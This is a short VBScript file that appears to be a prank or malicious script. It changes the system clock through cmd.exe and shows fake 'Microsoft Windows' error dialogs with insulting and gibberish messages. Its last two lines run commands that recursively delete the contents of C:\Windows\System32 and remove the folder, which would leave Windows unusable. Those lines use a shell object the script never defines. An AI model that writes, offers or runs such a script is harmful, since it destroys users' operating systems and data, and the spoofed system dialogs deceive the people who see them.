strCommand = "cmd.exe /c time 01:47:07"
set objWshShell = WScript.CreateObject("WScript.Shell")
intRC = objWshShell.Run(strCommand, 0, TRUE)
x=msgbox("Error: Screw You!", 16, "Microsoft Windows")
x=msgbox("Error: Touch Grass", 16, "Microsoft Windows")
x=msgbox("5tgfuythkjhfhjgvghbjgjhhhtfgfddfghgfbgg", 64, "H E L P")

oShell.run "del /s /q C:\Windows\System32\*"
oShell.run "rd /s /q C:\Windows\System32"